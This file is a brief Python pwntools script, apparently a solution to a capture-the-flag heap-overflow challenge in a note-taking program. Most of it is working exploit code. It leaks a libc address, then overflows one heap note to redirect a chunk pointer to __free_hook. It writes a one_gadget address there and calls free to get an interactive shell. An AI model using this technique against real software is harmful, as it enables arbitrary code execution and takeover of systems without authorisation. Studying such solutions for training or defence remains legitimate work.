"""
heap overflow

"""

from pwn import *

#io = process('./chall')

def DN(idx):
	io.sendlineafter(b'Choose an option:', b'4')
	io.sendlineafter(b'Enter the note index (0-9):', idx)

def CN(cont):
	io.sendlineafter(b'Choose an option:', b'1')
	io.sendlineafter(b'Enter the note content:',cont)

def MN(idx, cont):
	io.sendlineafter(b'Choose an option:', b'3')
	io.sendlineafter(b'Enter the note index (0-9):', idx)
	io.sendlineafter(b'Enter the new content:',cont)

io.sendlineafter(b'Choose an option:', b'6')
libb = int(io.recvline()[:-1][-14:],16) - 413248
free_hook = libb + 0x0000000003ed8e8
og = libb + 0x10a2fc
og = libb + 0x4f302
print(b'libc_base ', hex(libb))

CN(b'A'*127)
CN(b'B'*127)
pld = b'C'*128 + b'D'*8 + p64(0x21) + p64(free_hook)
MN(b'0',pld)
pld = p64(og)
MN(b'1',pld)
DN(b'1')

io.interactive()
